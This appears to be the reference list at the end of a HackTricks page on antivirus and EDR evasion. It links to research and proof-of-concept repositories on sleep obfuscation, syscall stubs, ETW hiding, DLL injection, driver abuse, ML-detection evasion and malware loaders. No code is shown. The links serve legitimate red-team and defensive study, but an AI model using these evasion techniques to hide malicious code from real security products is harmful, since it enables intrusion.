- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader technical analysis](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [tprtdll-Injection overview and export inventory](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [Trusted-twin self-injection PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [Trusted-twin cross-process injection PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)

{{#include ../banners/hacktricks-training.md}}
